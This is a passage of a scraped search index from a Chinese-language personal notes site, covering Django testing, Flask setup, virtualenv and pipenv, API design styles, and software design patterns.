为测试创建一个专用的数据库 查找名字以 test 开头的测试方法 在 test_was_published_recently_with_future_question 方法中，创建一个 Question 实例，该实例的 pub_data 字段的值是30天后的未来日期。 然后利用 assertIs() 方法，它发现 was_published_recently() 返回了True，而不是我们希望的 False。  最后，测试程序会通知我们哪个测试失败了，错误出现在哪一行。\n整个测试用例基本上和 Python 内置的 unittest 非常相似，大家可以参考 Python 教程中测试相关的章节。\n4. Fix the bug #  修改源代码，具体如下：\n# polls/models.py def was_published_recently(self): now = timezone.now() return now - datetime.timedelta(days=1) \u0026lt;= self.pub_date \u0026lt;= now 再次运行测试程序：\n$ python manage.py test polls Creating test database for alias \u0026#39;default\u0026#39;... . ---------------------------------------------------------------------- Ran 1 test in 0.001s OK Destroying test database for alias \u0026#39;default\u0026#39;... 可以看到 bug 已经没有了。\n5. More comprehensive tests #  def test_was_published_recently_with_old_question(self): \u0026#34;\u0026#34;\u0026#34; was_published_recently() returns False for questions whose pub_date is older than 1 day. \u0026#34;\u0026#34;\u0026#34; time = timezone.now() - datetime.timedelta(days=1, seconds=1) old_question = Question(pub_date=time) self.assertIs(old_question.was_published_recently(), False) def test_was_published_recently_with_recent_question(self): \u0026#34;\u0026#34;\u0026#34; was_published_recently() returns True for questions whose pub_date is within the last day. \u0026#34;\u0026#34;\u0026#34; time = timezone.now() - datetime.timedelta(hours=23, minutes=59, seconds=59) recent_question = Question(pub_date=time) self.assertIs(recent_question.was_published_recently(), True) Test a view #  The Django test client #  Django provides a test Client to simulate a user interacting with the code at the view level. We can use it in tests.py or even in the shell.\nWe will start again with the shell, where we need to do a couple of things that won’t be necessary in tests.py. The first is to set up the test environment in the shell:\n$ python manage.py shell \u0026gt;\u0026gt;\u0026gt; from django.test.utils import setup_test_environment \u0026gt;\u0026gt;\u0026gt; setup_test_environment() setup_test_environment() installs a template renderer which will allow us to examine some additional attributes on responses such as response.context that otherwise wouldn’t be available.\nNext we need to import the test client class:\n\u0026gt;\u0026gt;\u0026gt; from django.test import Client \u0026gt;\u0026gt;\u0026gt; # create an instance of the client for our use \u0026gt;\u0026gt;\u0026gt; client = Client() With that ready, we can ask the client to do some work for us:\n\u0026gt;\u0026gt;\u0026gt; # get a response from \u0026#39;/\u0026#39; \u0026gt;\u0026gt;\u0026gt; response = client.get(\u0026#39;/\u0026#39;) Not Found: / \u0026gt;\u0026gt;\u0026gt; # we should expect a 404 from that address; if you instead see an \u0026gt;\u0026gt;\u0026gt; # \u0026#34;Invalid HTTP_HOST header\u0026#34; error and a 400 response, you probably \u0026gt;\u0026gt;\u0026gt; # omitted the setup_test_environment() call described earlier. \u0026gt;\u0026gt;\u0026gt; response.status_code 404 \u0026gt;\u0026gt;\u0026gt; # on the other hand we should expect to find something at \u0026#39;/polls/\u0026#39; \u0026gt;\u0026gt;\u0026gt; # we\u0026#39;ll use \u0026#39;reverse()\u0026#39; rather than a hardcoded URL \u0026gt;\u0026gt;\u0026gt; from django.urls import reverse \u0026gt;\u0026gt;\u0026gt; response = client.get(reverse(\u0026#39;polls:index\u0026#39;)) \u0026gt;\u0026gt;\u0026gt; response.status_code 200 \u0026gt;\u0026gt;\u0026gt; response.content b\u0026#39;\\n\u0026lt;ul\u0026gt;\\n\\n\u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;/polls/1/\u0026#34;\u0026gt;What\u0026amp;#39;s up?\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt;\\n\\n\u0026lt;/ul\u0026gt;\\n\\n\u0026#39; \u0026gt;\u0026gt;\u0026gt; response.context[\u0026#39;latest_question_list\u0026#39;] \u0026lt;QuerySet [\u0026lt;Question: What\u0026#39;s up?\u0026gt;]\u0026gt; Improving our view #  # polls/views.py from django.utils import timezone class IndexView(generic.ListView): template_name = \u0026#39;polls/index.html\u0026#39; context_object_name = \u0026#39;latest_question_list\u0026#39; def get_queryset(self): \u0026#34;\u0026#34;\u0026#34; Return the last five published questions (not including those set to be published in the future). \u0026#34;\u0026#34;\u0026#34; return Question.objects.filter( pub_date__lte=timezone.now() ).order_by(\u0026#39;-pub_date\u0026#39;)[:5] Test our new view #  Add the following to polls/tests.py:\nfrom django.urls import reverse and we’ll create a shortcut function to create questions as well as a new test class:\ndef create_question(question_text, days): \u0026#34;\u0026#34;\u0026#34; Create a question with the given `question_text` and published the given number of `days` offset to now (negative for questions published in the past, positive for questions that have yet to be published). \u0026#34;\u0026#34;\u0026#34; time = timezone.now() + datetime.timedelta(days=days) return Question.objects.create(question_text=question_text, pub_date=time) class QuestionIndexViewTests(TestCase): def test_no_questions(self): \u0026#34;\u0026#34;\u0026#34; If no questions exist, an appropriate message is displayed. \u0026#34;\u0026#34;\u0026#34; response = self.client.get(reverse(\u0026#39;polls:index\u0026#39;)) self.assertEqual(response.status_code, 200) self.assertContains(response, \u0026#34;No polls are available.\u0026#34;) self.assertQuerysetEqual(response.context[\u0026#39;latest_question_list\u0026#39;], []) def test_past_question(self): \u0026#34;\u0026#34;\u0026#34; Questions with a pub_date in the past are displayed on the index page. \u0026#34;\u0026#34;\u0026#34; create_question(question_text=\u0026#34;Past question.\u0026#34;, days=-30) response = self.client.get(reverse(\u0026#39;polls:index\u0026#39;)) self.assertQuerysetEqual( response.context[\u0026#39;latest_question_list\u0026#39;], [\u0026#39;\u0026lt;Question: Past question.\u0026gt;\u0026#39;] ) def test_future_question(self): \u0026#34;\u0026#34;\u0026#34; Questions with a pub_date in the future aren\u0026#39;t displayed on the index page. \u0026#34;\u0026#34;\u0026#34; create_question(question_text=\u0026#34;Future question.\u0026#34;, days=30) response = self.client.get(reverse(\u0026#39;polls:index\u0026#39;)) self.assertContains(response, \u0026#34;No polls are available.\u0026#34;) self.assertQuerysetEqual(response.context[\u0026#39;latest_question_list\u0026#39;], []) def test_future_question_and_past_question(self): \u0026#34;\u0026#34;\u0026#34; Even if both past and future questions exist, only past questions are displayed. \u0026#34;\u0026#34;\u0026#34; create_question(question_text=\u0026#34;Past question.\u0026#34;, days=-30) create_question(question_text=\u0026#34;Future question.\u0026#34;, days=30) response = self.client.get(reverse(\u0026#39;polls:index\u0026#39;)) self.assertQuerysetEqual( response.context[\u0026#39;latest_question_list\u0026#39;], [\u0026#39;\u0026lt;Question: Past question.\u0026gt;\u0026#39;] ) def test_two_past_questions(self): \u0026#34;\u0026#34;\u0026#34; The questions index page may display multiple questions. \u0026#34;\u0026#34;\u0026#34; create_question(question_text=\u0026#34;Past question 1.\u0026#34;, days=-30) create_question(question_text=\u0026#34;Past question 2.\u0026#34;, days=-5) response = self.client.get(reverse(\u0026#39;polls:index\u0026#39;)) self.assertQuerysetEqual( response.context[\u0026#39;latest_question_list\u0026#39;], [\u0026#39;\u0026lt;Question: Past question 2.\u0026gt;\u0026#39;, \u0026#39;\u0026lt;Question: Past question 1.\u0026gt;\u0026#39;] ) Testing the DetailView #  # polls/views.py class DetailView(generic.DetailView): ... def get_queryset(self): \u0026#34;\u0026#34;\u0026#34; Excludes any questions that aren\u0026#39;t published yet. \u0026#34;\u0026#34;\u0026#34; return Question.objects.filter(pub_date__lte=timezone.now()) And of course, we will add some tests, to check that a Question whose pub_date is in the past can be displayed, and that one with a pub_date in the future is not:\n# polls/tests.py class QuestionDetailViewTests(TestCase): def test_future_question(self): \u0026#34;\u0026#34;\u0026#34; The detail view of a question with a pub_date in the future returns a 404 not found. \u0026#34;\u0026#34;\u0026#34; future_question = create_question(question_text=\u0026#39;Future question.\u0026#39;, days=5) url = reverse(\u0026#39;polls:detail\u0026#39;, args=(future_question.id,)) response = self.client.get(url) self.assertEqual(response.status_code, 404) def test_past_question(self): \u0026#34;\u0026#34;\u0026#34; The detail view of a question with a pub_date in the past displays the question\u0026#39;s text. \u0026#34;\u0026#34;\u0026#34; past_question = create_question(question_text=\u0026#39;Past Question.\u0026#39;, days=-5) url = reverse(\u0026#39;polls:detail\u0026#39;, args=(past_question.id,)) response = self.client.get(url) self.assertContains(response, past_question.question_text) "},{"id":385,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/python/flask/tutorial/1.projectlayout/","title":"1. Project Layout","section":"Tutorial","content":"Project Layout #  一个 flask 项目可以单单由一个文件构成：\nfrom flask import Flask app = Flask(__name__) @app.route(\u0026#39;/\u0026#39;) def hello(): return \u0026#39;Hello, World!\u0026#39; flask 项目的 .gitignore 可以通过以下的方式编写：\nvenv/\r*.pyc\r__pycache__/\rinstance/\r.pytest_cache/\r.coverage\rhtmlcov/\rdist/\rbuild/\r*.egg-info/\r"},{"id":386,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/python/flask/tutorial/2.applicationsetup/","title":"2. Application Setup","section":"Tutorial","content":"Application Setup #  Application Factory #  首先创建一个文件夹 flaskr，然后在文件夹中创建一个文件 __init__.py：\nimport os from flask import Flask def create_app(test_config=None): # create and configure the app app = Flask(__name__, instance_relative_config=True) app.config.from_mapping( SECRET_KEY=\u0026#39;dev\u0026#39;, DATABASE=os.path.join(app.instance_path, \u0026#39;flaskr.sqlite\u0026#39;), ) if test_config is None: # load the instance config, if it exists, when not testing app.config.from_pyfile(\u0026#39;config.py\u0026#39;, silent=True) else: # load the test config if passed in app.config.from_mapping(test_config) # ensure the instance folder exists try: os.makedirs(app.instance_path) except OSError: pass # a simple page that says hello @app.route(\u0026#39;/hello\u0026#39;) def hello(): return \u0026#39;Hello, World!\u0026#39; return app create_app 就是项目函数，他主要完成的功能见http://flask.pocoo.org/docs/1.0/tutorial/factory/.\nRun the application #  需要先设置项目函数的包与开发的模式：\nexport FLASK_APP=flaskr export FLASK_ENV=development 然后运行这个项目：\nflask run 之后在浏览器中访问 http://127.0.0.1/hello 即可实现访问。\n"},{"id":387,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/python/flask/tutorial/3.databases/","title":"3. Databases","section":"Tutorial","content":"Define and Access Database #  Connect to Database #  创建文件 flaskr/db.py 添加以下的内容：\nimport sqlite3 import click from flask import current_app, g from flask.cli import with_appcontext def get_db(): if \u0026#39;db\u0026#39; not in g: g.db = sqlite3.connect( current_app.config[\u0026#39;DATABASE\u0026#39;], detect_types=sqlite3.PARSE_DECLTYPES ) g.db.row_factory = sqlite3.Row return g.db def close_db(e=None): db = g.pop(\u0026#39;db\u0026#39;, None) if db is not None: db.close() "},{"id":388,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/python/virutalenv/","title":"Virutalenv","section":"Python","content":" 学习地址：https://docs.python-guide.org/dev/virtualenvs/\n pipenv \u0026amp; virtualenv #  Make sure you have got python and pip install:\n$ python --version $ pip --version pipenv #    Install pipenv:\n$ pip install --user pipenv   Install packages for your project:\n$ cd myproject $ pipenv install requests   Using installed packages:\nFor script file as below (main.py):\nimport requests response = requests.get(\u0026#39;https://httpbin.org/ip\u0026#39;) print(\u0026#39;Your IP is {0}\u0026#39;.format(response.json()[\u0026#39;origin\u0026#39;])) Then you can run this script using pipenv run:\n$ pipenv run python main.py It’s also possible to spawn a new shell that ensures all commands have access to your installed packages with\n$ pipenv shell   virtualenv #    Install virutalenv via pip:\n$ pip install virtualenv ... $ virtualenv --version # Test your installation   virtualenv venv will create a folder in the current directory which will contain the Python executable files, and a copy of the pip library which you can use to install other packages:\n$ virtualenv \u0026lt;venv\u0026gt; # omitting the name will place the files in the current directory instead. You can also chose your own python interpreter:\n$ virtualenv -p /usr/bin/python2.7 \u0026lt;venv\u0026gt;   To begin using the virtual environment, it needs to be activated:\n$ source venv/bin/activate   If you are done working in the virtual environment for the moment, you can deactivate it:\n$ deactivate   virtualenvwrapper #    To install (make sure virtualenv is already installed):\n$ pip install virualenvwrapper $ export WORKON_HOME=~/.python_envs $ source /usr/local/bin/virtualenvwrapper.sh   Create a virtual environment:\n$ workon \u0026lt;my_project\u0026gt;   Alternatively, you can make a project, which creates the virtual environment, and also a project directory inside $WORKON_HOME, which is cd-ed into when you workon myproject:\n$ mkproject \u0026lt;my_project\u0026gt;   Deactivating is still the same:\n$ deactivate   To delete the enviroment:\n$ rmvirtualenv \u0026lt;venv\u0026gt;   Other useful commands\n lsvirtualenv: List all of the environments. cdvirtualenv: Navigate into the directory of the currently activated virtual environment, so you can browse its site-packages, for example. cdsitepackages: Like the above, but directly into site-packages directory. lssitepackages: Shows contents of site-packages directory.    "},{"id":389,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/python/%E8%87%AA%E5%AD%A6%E7%AC%94%E8%AE%B0/","title":"自学笔记","section":"Python","content":"自学笔记 (pdf) #  \r"},{"id":390,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/systemdesign/api%E8%AE%BE%E8%AE%A1/","title":"Api设计","section":"SystemDesign","content":"API 设计 #  RESTful #   For TypeScript: https://github.com/thiagobustamante/typescript-rest\n REST: Representational state transfer.\nRESTful 是一种面向资源的过时 API 设计理念，他基于 http 协议，没有单独定义自己的一套协议，只是一种 API 设计范式。\n它提供了四个指导原则：\n Resource-Base 基于资源的：一个 uri 单独对应于一个资源； Manipulation Through Representations 动作表示：对资源的不同动作通过方法或参数表示； Self-Descriptive Message 自描述信息：每条请求都能没有上下文地无状态地，唯一执行一个动作； Hypermedia as the Engine of Application State (HATEOAS)：用高级的请求体来表示状态；  GraphQL #   For TypeScript: https://github.com/MichalLytek/type-graphql, https://typegraphql.com/\nOfficial Website: https://graphql.org/\n GraphQL: Graph Query Language.\n  介绍：GraphQL 是 Facebook 为了解决 RESTful 设计模式在系统庞大之后出现的各种问题应运而生的接口描述语言。\n  在 API 设计这个问题上：Graph API 对外只暴露一个接口（比如：https://leetcode.com/graphql），资源通过图的方式关联式地设计在这个接口中。\n  与 RESTful：在系统中，GraphQL 与 RESTful 通常是同时存在的关系而不是完全取代。\n  PS: 许多诸如 GraphQL 与 RESTful 的区别等问题可以查看官方的文档：https://graphql.org/faq/#does-graphql-use-http\nThrift-RPC #   官方：https://thrift.apache.org/、\nIDL 文档：https://thrift.apache.org/docs/idl.html\n Thrift 是什么，Apache 提供的一个 API 序列化框架：\n Apache Thrift 是一个跨语音的可扩展服务器开发框架，可以在语言间无缝高效地迁移。  PostScript：概念学习：\n 微服务： 服务发现： 服务限流： 服务熔断： 负载均衡：  gRPC #  "},{"id":391,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/systemdesign/designpatterns/1.%E5%88%9B%E5%BB%BA%E5%9E%8B%E6%A8%A1%E5%BC%8F/1.%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F/","title":"1.工厂模式","section":"1.创建型模式","content":"工厂模式 #  介绍 #  意图：\n 定义一个创建对象的接口，让其子类自己决定实例化哪一个工厂类，工厂模式使其创建过程延迟到子类进行。  应用实例：\n 您需要一辆汽车，可以直接从工厂里面提货，而不用去管这辆汽车是怎么做出来的，以及这个汽车里面的具体实现。 Hibernate 换数据库只需换方言和驱动就可以。 日志记录器：记录可能记录到本地硬盘、系统事件、远程服务器等，用户可以选择记录日志到什么地方。 数据库访问，当用户不知道最后系统采用哪一类数据库，以及数据库可能有变化时。 设计一个连接服务器的框架，需要三个协议，\u0026ldquo;POP3\u0026rdquo;、\u0026ldquo;IMAP\u0026rdquo;、\u0026ldquo;HTTP\u0026rdquo;，可以把这三个作为产品类，共同实现一个接口。  优点：\n 一个调用者想创建一个对象，只要知道其名称就可以了。 扩展性高，如果想增加一个产品，只要扩展一个工厂类就可以。 屏蔽产品的具体实现，调用者只关心产品的接口。  缺点：\n 每次增加一个产品时，都需要增加一个具体类和对象实现工厂，使得系统中类的个数成倍增加，在一定程度上增加了系统的复杂度，同时也增加了系统具体类的依赖。这并不是什么好事。  PostScript:\n 我感觉所谓的工厂模式，就是重新封装一层接口。  例子 #  工厂模式也就是\n  鼠标工厂是个父类，有生产鼠标这个接口。\n  戴尔鼠标工厂，惠普鼠标工厂继承鼠标工厂，可以分别生产戴尔鼠标，惠普鼠标。\n  生产哪种鼠标不再由参数决定，而是创建鼠标工厂时，由戴尔鼠标工厂创建。后续直接调用**鼠标工厂.生产鼠标()**即可\n  "},{"id":392,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/systemdesign/designpatterns/1.%E5%88%9B%E5%BB%BA%E5%9E%8B%E6%A8%A1%E5%BC%8F/2.%E6%8A%BD%E8%B1%A1%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F/","title":"2.抽象工厂模式","section":"1.创建型模式","content":"抽象工厂模式 #  抽象工厂模式（Abstract Factory Pattern）是围绕一个超级工厂创建其他工厂。该超级工厂又称为其他工厂的工厂。这种类型的设计模式属于创建型模式，它提供了一种创建对象的最佳方式。\n在抽象工厂模式中，接口是负责创建一个相关对象的工厂，不需要显式指定它们的类。每个生成的工厂都能按照工厂模式提供对象。\n介绍 #  意图：\n 提供一个创建一系列相关或相互依赖对象的接口，而无需指定它们具体的类。  应用实例：\n QQ 换皮肤，一整套一起换。 生成不同操作系统的程序。  优点：\n 当一个产品族中的多个对象被设计成一起工作时，它能保证客户端始终只使用同一个产品族中的对象。  缺点：\n 产品族扩展非常困难 要增加一个系列的某一产品，既要在抽象的 Creator 里加代码，又要在具体的里面加代码。  PostScript：\n 我感觉抽象工厂模式就是在工厂模式的两层（底层对象与对外接口）之间再加入一层。 这一层称为超级工厂，最后的派生依赖图类似一个漏斗状。  例子 #  抽象工厂模式也就是不仅生产鼠标，同时生产键盘。也就是：\n  PC 厂商是个父类，有生产鼠标，生产键盘两个接口。\n  戴尔工厂，惠普工厂继承它，可以分别生产戴尔鼠标+戴尔键盘，和惠普鼠标+惠普键盘。\n  创建工厂时，由戴尔工厂创建。\n  后续**工厂.生产鼠标()**则生产戴尔鼠标，**工厂.生产键盘()**则生产戴尔键盘。\n  关于扩展性：\n  假设我们增加华硕工厂，则我们需要增加华硕工厂，和戴尔工厂一样，继承 PC 厂商。\n之后创建华硕鼠标，继承鼠标类。创建华硕键盘，继承键盘类即可。\n  假设我们增加耳麦这个产品，则首先我们需要增加耳麦这个父类，再加上戴尔耳麦，惠普耳麦这两个子类。\n之后在PC厂商这个父类中，增加生产耳麦的接口。最后在戴尔工厂，惠普工厂这两个类中，分别实现生产戴尔耳麦，惠普耳麦的功能。\n  "},{"id":393,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/systemdesign/designpatterns/1.%E5%88%9B%E5%BB%BA%E5%9E%8B%E6%A8%A1%E5%BC%8F/3.%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F/","title":"3.单例模式","section":"1.创建型模式","content":"单例模式 #  单例模式（Singleton Pattern）是 Java 中最简单的设计模式之一。这种类型的设计模式属于创建型模式，它提供了一种创建对象的最佳方式。\n这种模式涉及到一个单一的类，该类负责创建自己的对象，同时确保只有单个对象被创建。这个类提供了一种访问其唯一的对象的方式，可以直接访问，不需要实例化该类的对象。\n它有以下的三个主要的特点：\n  单例类只能有一个实例。\n  单例类必须自己创建自己的唯一实例。\n  单例类必须给所有其他对象提供这一实例。\n  介绍 #  意图：\n  保证一个类仅有一个实例，并提供一个访问它的全局访问点。\n  一个全局使用的类频繁地创建与销毁、当您想控制实例数目节省系统资源的时候，使用这个创建模式。\n  应用实例：\n  一个班级只有一个班主任。\n  Windows 是多进程多线程的，在操作一个文件的时候，就不可避免地出现多个进程或线程同时操作一个文件的现象，所以所有文件的处理必须通过唯一的实例来进行。\n  一些设备管理器常常设计为单例模式，比如一个电脑有两台打印机，在输出的时候就要处理不能两台打印机打印同一个文件。\n  优点：\n  在内存里只有一个实例，减少了内存的开销，尤其是频繁的创建和销毁实例（比如管理学院首页页面缓存）。\n  避免对资源的多重占用（比如写文件操作）。\n  缺点：\n 没有接口，不能继承，与单一职责原则冲突，一个类应该只关心内部逻辑，而不关心外面怎么样来实例化。  使用场景：\n  要求生产唯一序列号。\n  WEB 中的计数器，不用每次刷新都在数据库里加一次，用单例先缓存起来。\n  创建的一个对象需要消耗的资源过多，比如 I/O 与数据库的连接等。\n  注意事项：\n getInstance() 方法中需要使用同步锁 synchronized (Singleton.class) 防止多线程同时进入造成 instance 被多次实例化。  "},{"id":394,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/systemdesign/designpatterns/1.%E5%88%9B%E5%BB%BA%E5%9E%8B%E6%A8%A1%E5%BC%8F/4.%E5%BB%BA%E9%80%A0%E8%80%85%E6%A8%A1%E5%BC%8F/","title":"4.建造者模式","section":"1.创建型模式","content":"建造者模式 #  建造者模式（Builder Pattern）使用多个简单的对象一步一步构建成一个复杂的对象。这种类型的设计模式属于创建型模式，它提供了一种创建对象的最佳方式。\n一个 Builder 类会一步一步构造最终的对象。该 Builder 类是独立于其他对象的。\n介绍 #  意图：\n  将一个复杂的构建与其表示相分离，使得同样的构建过程可以创建不同的表示。\n  主要解决在软件系统中，有时候面临着\u0026quot;一个复杂对象\u0026quot;的创建工作，其通常由各个部分的子对象用一定的算法构成；由于需求的变化，这个复杂对象的各个部分经常面临着剧烈的变化，但是将它们组合在一起的算法却相对稳定。\n  应用实例：\n 去肯德基，汉堡、可乐、薯条、炸鸡翅等是不变的，而其组合是经常变化的，生成出所谓的\u0026quot;套餐\u0026quot;。 JAVA 中的 StringBuilder。  优点：\n 建造者独立，易扩展。 便于控制细节风险。  缺点：\n 产品必须有共同点，范围有限制。 如内部变化复杂，会有很多的建造类。  例子 #  "},{"id":395,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/systemdesign/designpatterns/1.%E5%88%9B%E5%BB%BA%E5%9E%8B%E6%A8%A1%E5%BC%8F/5.%E5%8E%9F%E5%9E%8B%E6%A8%A1%E5%BC%8F/","title":"5.原型模式","section":"1.创建型模式","content":"原型模式 #  原型模式（Prototype Pattern）是实现了一个原型接口，该接口用于创建当前对象的克隆。\n当直接创建对象的代价比较大时，则采用这种模式。例如，一个对象需要在一个高代价的数据库操作之后被创建。我们可以缓存该对象，在下一个请求时返回它的克隆，在需要的时候更新数据库，以此来减少数据库调用。\n介绍 #  意图：\n 用原型实例指定创建对象的种类，并且通过拷贝这些原型创建新的对象。 它有以下的几个使用场景：  当一个系统应该独立于它的产品创建，构成和表示时。 当要实例化的类是在运行时刻指定时，例如，通过动态装载。 为了避免创建一个与产品类层次平行的工厂类层次时。 当一个类的实例只能有几个不同状态组合中的一种时。建立相应数目的原型并克隆它们可能比每次用合适的状态手工实例化该类更方便一些。    优点：\n 性能提高。 逃避构造函数的约束。  缺点：\n 配备克隆方法需要对类的功能进行通盘考虑，这对于全新的类不是很难，但对于已有的类不一定很容易，特别当一个类引用不支持串行化的间接对象，或者引用含有循环结构的时候。 必须实现 Cloneable 接口。  例子 #  概括地说，主要有以下的使用场景：\n 资源优化场景。 类初始化需要消化非常多的资源，这个资源包括数据、硬件资源等。 性能和安全要求的场景。 通过 new 产生一个对象需要非常繁琐的数据准备或访问权限，则可以使用原型模式。 一个对象多个修改者的场景。 一个对象需要提供给其他对象访问，而且各个调用者可能都需要修改其值时，可以考虑使用原型模式拷贝多个对象供调用者使用。 在实际项目中，原型模式很少单独出现，一般是和工厂方法模式一起出现，通过 clone 的方法创建一个对象，然后由工厂方法提供给调用者。原型模式已经与 Java 融为浑然一体，大家可以随手拿来使用。  "},{"id":396,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/systemdesign/designpatterns/2.%E7%BB%93%E6%9E%84%E5%9E%8B%E6%A8%A1%E5%BC%8F/10.%E8%A3%85%E9%A5%B0%E5%99%A8%E6%A8%A1%E5%BC%8F/","title":"10.装饰器模式","section":"2.结构型模式","content":"装饰器模式 #  装饰器模式（Decorator Pattern）允许向一个现有的对象添加新的功能，同时又不改变其结构。\n这种模式创建了一个装饰类，用来包装原有的类，并在保持类方法签名完整性的前提下，提供了额外的功能。\n介绍 #  意图：\n  动态地给一个对象添加一些额外的职责。就增加功能来说，装饰器模式相比生成子类更为灵活。\n  当我们不想增加很多子类的情况下扩展类，使用装饰器。它将具体功能职责划分，同时继承装饰者模式。\n  优点：\n 装饰类和被装饰类可以独立发展，不会相互耦合，装饰模式是继承的一个替代模式，装饰模式可以动态扩展一个实现类的功能。  缺点：\n 多层装饰比较复杂。  "},{"id":397,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/systemdesign/designpatterns/2.%E7%BB%93%E6%9E%84%E5%9E%8B%E6%A8%A1%E5%BC%8F/11.%E5%A4%96%E8%A7%82%E6%A8%A1%E5%BC%8F/","title":"11.外观模式","section":"2.结构型模式","content":"外观模式 #  外观模式（Facade Pattern）隐藏系统的复杂性，并向客户端提供了一个客户端可以访问系统的接口。\n介绍 #  意图：\n 为子系统中的一组接口提供一个一致的界面，外观模式定义了一个高层接口，这个接口使得这一子系统更加容易使用。 当你不需要客户端知道系统内部的复杂联系时，你需要设计一个外观模式的系统。  优点：\n 减少系统相互依赖。 提高灵活性。 提高了安全性。  缺点：\n 不符合开闭原则，如果要改东西很麻烦，继承重写都不合适。  "},{"id":398,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/systemdesign/designpatterns/2.%E7%BB%93%E6%9E%84%E5%9E%8B%E6%A8%A1%E5%BC%8F/12.%E4%BA%AB%E5%85%83%E6%A8%A1%E5%BC%8F/","title":"12.享元模式","section":"2.结构型模式","content":"享元模式 #  享元模式（Flyweight Pattern）主要用于减少创建对象的数量，以减少内存占用和提高性能。这种类型的设计模式属于结构型模式，它提供了减少对象数量从而改善应用所需的对象结构的方式。\n享元模式尝试重用现有的同类对象，如果未找到匹配的对象，则创建新对象。\n介绍 #  意图：\n 运用共享技术有效地支持大量细粒度的对象。 在有大量对象时，有可能会造成内存溢出，我们把其中共同的部分抽象出来，如果有相同的业务请求，直接返回在内存中已有的对象，避免重新创建。  应用实例：\n JAVA 中的 String，如果有则返回，如果没有则创建一个字符串保存在字符串缓存池里面。 数据库的数据池。  优点：\n 大大减少对象的创建，降低系统的内存，使效率提高。  缺点：\n 提高了系统的复杂度，需要分离出外部状态和内部状态。 而且外部状态具有固有化的性质，不应该随着内部状态的变化而变化，否则会造成系统的混乱。  PostScript：\n 注意划分外部状态和内部状态，否则可能会引起线程安全问题。 这些类必须有一个工厂对象加以控制。  "},{"id":399,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/systemdesign/designpatterns/2.%E7%BB%93%E6%9E%84%E5%9E%8B%E6%A8%A1%E5%BC%8F/13.%E4%BB%A3%E7%90%86%E6%A8%A1%E5%BC%8F/","title":"13.代理模式","section":"2.结构型模式","content":"代理模式 #  在代理模式（Proxy Pattern）中，一个类代表另一个类的功能。\n介绍 #  意图：\n  为其他对象提供一种代理以控制对这个对象的访问。\n  主要解决在直接访问对象时带来的问题，\n比如说：要访问的对象在远程的机器上。在面向对象系统中，有些对象由于某些原因（比如对象创建开销很大，或者某些操作需要安全控制，或者需要进程外的访问），直接访问会给使用者或者系统结构带来很多麻烦，我们可以在访问此对象时加上一个对此对象的访问层。\n  应用实例：\n Windows 里面的快捷方式。 买火车票不一定在火车站买，也可以去代售点。  优点：\n 职责清晰、高扩展性、智能化。  缺点：\n 由于在客户端和真实主题之间增加了代理对象，因此有些类型的代理模式可能会造成请求的处理速度变慢。 实现代理模式需要额外的工作，有些代理模式的实现非常复杂。  PostScript：\n 和适配器模式的区别：适配器模式主要改变所考虑对象的接口，而代理模式不能改变所代理类的接口。 和装饰器模式的区别：装饰器模式为了增强功能，而代理模式是为了加以控制。  "},{"id":400,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/systemdesign/designpatterns/2.%E7%BB%93%E6%9E%84%E5%9E%8B%E6%A8%A1%E5%BC%8F/6.%E9%80%82%E9%85%8D%E5%99%A8%E6%A8%A1%E5%BC%8F/","title":"6.适配器模式","section":"2.结构型模式","content":"适配器模式 #  适配器模式（Adapter Pattern）是作为两个不兼容的接口之间的桥梁。这种类型的设计模式属于结构型模式，它结合了两个独立接口的功能。\n举个真实的例子，读卡器是作为内存卡和笔记本之间的适配器。您将内存卡插入读卡器，再将读卡器插入笔记本，这样就可以通过笔记本来读取内存卡。\n介绍 #  意图：\n  将一个类的接口转换成客户希望的另外一个接口。适配器模式使得原本由于接口不兼容而不能一起工作的那些类可以一起工作。\n  概括的说，它主要有以下的应用场景：\n 系统需要使用现有的类，而此类的接口不符合系统的需要 想要建立一个可以重复使用的类，用于与一些彼此之间没有太大关联的一些类，包括一些可能在将来引进的类一起工作，这些源类不一定有一致的接口。 通过接口转换，将一个类插入另一个类系中。（比如老虎和飞禽，现在多了一个飞虎，在不增加实体的需求下，增加一个适配器，在里面包容一个虎对象，实现飞的接口。）    优点：\n 可以让任何两个没有关联的类一起运行。 提高了类的复用。 增加了类的透明度。 灵活性好。  缺点：\n 过多地使用适配器，会让系统非常零乱，不易整体进行把握。一个系统如果太多出现这种情况，无异于一场灾难。因此如果不是很有必要，可以不使用适配器，而是直接对系统进行重构。 由于 JAVA 至多继承一个类，所以至多只能适配一个适配者类，而且目标类必须是抽象类。  PostScript：\n  有动机地修改一个正常运行的系统的接口，这时应该考虑使用适配器模式。\n  适配器不是在详细设计时添加的，而是解决正在服役的项目的问题。\n  例子 #  比如下面的例子：\n 原本：我们有一个 MediaPlayer 的接口，一个实现了这个接口的类 AudioPlayer。它只能播放 mp3。格式的音频文件； 原本：我们还有一个 AdvancedMediaPlayer 的接口，实现了这个接口的类 VlcPlayer、Mp4Player。该类可以播放 vlc 和 mp4 格式的音频文件。 现在我们需要：AudioPlayer 